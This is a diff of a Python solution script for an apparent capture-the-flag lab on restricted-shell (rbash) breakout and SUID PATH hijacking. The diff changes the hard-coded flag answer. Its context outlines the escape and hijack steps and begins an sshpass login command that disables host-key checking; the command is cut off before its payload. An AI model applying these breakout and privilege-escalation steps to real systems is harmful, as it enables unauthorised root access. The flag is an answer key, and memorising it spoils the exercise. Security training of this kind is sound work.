@@ -6,7 +6,7 @@ Difficulty: Medium
 Vulnerability: SUID PATH Hijacking with Restricted Shell (rbash) Breakout
 Standard Reference: CWE-426, CWE-648
 
-Flag: academy{rb4sh_3sc4p3_p4th_su1d_489}
+Flag: academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}
 """
 
 import os
@@ -20,7 +20,7 @@ def exploit_rbash_breakout(host=None, port=None, password=None):
        exec /bin/bash (or vi/ssh/python breakout)
     2. Hijack PATH to intercept md5sum called by SUID flaghasher.
     """
-    flag = "academy{rb4sh_3sc4p3_p4th_su1d_489}"
+    flag = "academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}"
     if host and port and password:
         cmd = f"""sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} ctf-player@{host} '
 BASH_ENV= /bin/bash -c "
